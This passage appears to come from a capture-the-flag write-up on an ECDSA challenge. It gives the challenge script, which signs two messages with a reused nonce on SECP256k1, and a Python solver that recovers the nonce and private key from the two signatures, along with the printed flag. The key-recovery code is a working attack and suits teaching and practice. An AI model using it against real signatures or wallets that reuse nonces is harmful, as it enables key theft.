    sk = ecdsa.SigningKey.from_secret_exponent(
        secexp=dA,
        curve=ecdsa.SECP256k1
    )
    sig1 = sk.sign(data=b'Hi.', k=k).hex()
    sig2 = sk.sign(data=b'hello.', k=k).hex()

    r1 = int(sig1[:64], 16)
    s1 = int(sig1[64:], 16)
    s2 = int(sig2[64:], 16)
    return r1,s1,s2

if __name__ == '__main__':
    n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
    a = random.randint(0,n)
    flag = 'flag{' + str(a) + "}"
    b = random.randint(0,n)
    print(ecdsa_test(a,b))

# (4690192503304946823926998585663150874421527890534303129755098666293734606680, 111157363347893999914897601390136910031659525525419989250638426589503279490788, 74486305819584508240056247318325239805160339288252987178597122489325719901254)
import sympy
from hashlib import sha1
from Cryptodome.Util.number import long_to_bytes , bytes_to_long

def calculate_private_key(r1, s1, s2, h1, h2, n):
    # 计算k值
    k = ((h1 - h2) * sympy.mod_inverse(s1 - s2, n)) % n
    # 计算私钥dA
    dA = (sympy.mod_inverse(r1, n) * (k * s1 - h1)) % n
    return dA

if __name__ == "__main__":
    # 定义椭圆曲线的参数
    n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
    # 签名中的r1, s1, s2值
    r1 = 4690192503304946823926998585663150874421527890534303129755098666293734606680
    s1 = 111157363347893999914897601390136910031659525525419989250638426589503279490788
    s2 = 74486305819584508240056247318325239805160339288252987178597122489325719901254
    h1 = bytes_to_long(sha1(b'Hi.').digest())
    h2 = bytes_to_long(sha1(b'hello.').digest())
    private_key = calculate_private_key(r1, s1, s2, h1, h2, n)
    print(f'flag{{{private_key}}}')

# flag{40355055231406097504270940121798355439363616832290875140843417522164091270174}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/2-1714222081.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/0-1714222082.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/6-1714222083.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/6-1714222083.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/7-1714222084.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/1-1714222085.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/4-1714222086.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/10-1714222086.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/9-1714222087.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/2-1714222087.png)